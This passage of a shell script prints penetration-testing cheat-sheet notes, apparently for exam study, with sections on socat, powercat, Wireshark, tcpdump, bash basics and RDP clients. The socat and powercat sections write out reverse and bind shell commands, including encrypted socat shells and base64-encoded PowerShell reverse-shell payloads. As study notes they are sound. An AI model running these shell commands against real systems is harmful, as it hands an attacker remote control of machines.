    echo "socat TCP4:$ip:$port EXEC:/bin/bash"
    echo ""
    echo "socat can also encrypt the contents of the communication"
    echo ""
    echo "create a cert with openssl"
    echo "openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt"
    echo ""
    echo "cat bind_shell.key bind_chell.cert > bind_shell.pem"
    echo "# socat requires the .pem"
    echo ""
    echo "create the ssl encrypted socat listener"
    echo "sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash"
    echo ""
    echo "connect to the enrypted bind shell"
    echo ""
    echo "socat - OPENSSL:$ip:$port,verify=0"
    echo " - passes STDIN to the connecting shell"
    echo ""
    echo "Kali Box: socat TCP4-LISTEN:443,fork STDOUT"
    echo "socat -d -d TCP4:192.168.X.X:443 EXEC:'cmd.exe',pipes"
}

function help-powercat {
    print-figlet "powercat"
    echo ""
    echo "you are going to have to . source the powercat"
    echo ""
    echo ". powercat.ps1"
    echo ""
    echo "then you can do a powercat -h or just run the program"
    echo ""
    echo "demonstration of sending powercat to linux with powercat"
    echo ""
    echo "powercat -c $ip -p $port -i c:\\tools\\practical_tools\powercat.ps1"
    echo "  -c specifies client mode" 
    echo "  -i indicates the local file that will transfer to the remote listener"
    echo ""
    echo "Powercat reverse shells"
    echo ""
    echo "powercat -c $ip -p $port -e cmd.exe"
    echo ""
    echo "Powercat bind shells"
    echo ""
    echo "powercat -l -p $port -e cmd.exe"
    echo "   -l indicates that it is listening"
    echo ""
    echo "Powercat standalone payloads"
    echo ""
    echo "powercat -c $ip -p $port -e cmd.exe -g > reverseshell.ps1"
    echo "./reverseshell.ps1 "
    echo "this script will then connect to the attacker"
    echo ""
    echo "this is create a base64 encoded script"
    echo "powercat -c $ip -p $port -e cmd.exe -ge > encodedreverseshell.ps1"
    echo "This cannot be directly encoded"
    echo ""
    echo "powershell.exe -E paste in the encoded reverse shell"

}

function help-wireshark {
    print-figlet "Wireshark"
    echo ""
    echo "Capture filters will reduce the amout of traffic we capture"
    echo ""
    echo "use the net 10.11.1.0/24 to only capture the traffic you want"
    echo " -this is done before the capture is started"
    echo ""
    echo "Display filters"
    echo ""
    echo "tcp.port == 21"
    echo "tcp.port == 80"
    echo ""
}

function help-tcpdump {
    print-figlet "tcpdump"
    echo ""
    echo "Filtering Traffic"
    echo ""
    echo "sudo tcpdumpt -n -r file.pcap"
    echo ""
    echo "sudo tcpdump -n src host $ip -r somecapture.pcap"
    echo "                src host $ip is the filter"
    echo ""
    echo "sudo tcpdump -nX somecapture.pcap"
    echo "       X will print in ascii and hex format"
    echo ""
    echo "advanced header filtering"
    echo "Looking for ACK and PUSH flags"
    echo ""
    echo "echo \"\$((2#00011000))\" <-- showing that PUSH and ACK = 24"
    echo ""
    echo "sudo tcpdump -A -n 'tcp[13] = 24' -r somepcap.pcap"


}

function help-bash {
    print-figlet "bash tips"
    echo "variables"
    echo ""
    echo "\$0 the name of the script"
    echo "\$1 the first argument"
    echo "\$2 the second argument"
    echo ""
    echo 'read -p "prompt: " variable'
    echo 'read -sp "prompt: " passwordvar'
    echo ""
    echo "simple if statment"
    echo ""
    echo "if [ some test ] "
    echo "then"
    echo "  some action"
    echo "else"
    echo "  some other action"
    echo "fi"
}

function help-rdp {
print-figlet "Remote Desktop"
if which tldr > /dev/null; then tldr xfreerdp;echo ; fi
if which tldr > /dev/null; then tldr rdesktop;echo ; fi
if which tldr > /dev/null; then tldr remmina;echo ; fi
echo "${reset}${yellow}"
echo "   xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:$ip /u:$username /p:$password"
echo "   xfreerdp /u:\$username /p:\$password /cert:ignore /v:\$ip"
echo ""
echo "${yellow}   rdesktop -g 70% -u \$username-p \$password \$ip "
echo ""
echo "${yellow}   remmina # is another program that should be installed"


}
